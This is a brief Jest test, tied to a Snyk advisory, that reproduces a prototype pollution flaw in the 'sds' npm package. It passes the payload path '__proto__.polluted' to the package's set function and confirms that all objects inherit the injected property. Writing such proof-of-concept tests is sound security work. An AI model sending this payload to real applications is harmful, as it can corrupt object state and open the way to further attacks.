//https://snyk.io/vuln/SNYK-JS-SDS-564123
test("prototype pollution in sds", () => {
  const root = require("sds");

  obj = {};
  let payload = "__proto__.polluted";

  expect({}.polluted).toBe(undefined);

  root.set({}, payload, true);

  expect({}.polluted).toBe(true);
});
